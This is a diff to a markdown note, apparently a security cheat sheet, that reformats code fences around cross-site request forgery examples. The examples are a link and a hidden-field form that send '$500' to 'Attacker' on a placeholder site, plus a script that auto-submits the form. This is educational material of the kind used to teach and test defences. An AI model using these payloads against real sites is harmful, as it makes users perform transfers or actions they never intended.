@@ -3,25 +3,25 @@
 CSRF is an attack vector that allows an attacker to get the users to perform actions that they do not intend to perform. 
 
 ### Get Request
-`
+```html
 <a href="http://site.com/send?to=Attacker&amount=$500">Click me!</a>
-`
+```
 ### Post Request
-`javascript
+```html
 <form action="http://site.com/send" method="POST">
 	<input type="hidden" name="to" value="Attacker"/>
 	<input type="hidden" name="amount" value="$500"/>
 	<input type="submit" value="Click me"/>
 </form>
-`
+```
 
 To perform an automatic submit:
 
-`javascript
+```javascript
 <script>
 	document.forms[0].submit();
 </script>
-`
+```
 
 ![CSRF](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/csrf-cross-site-request-forgery.png)
 
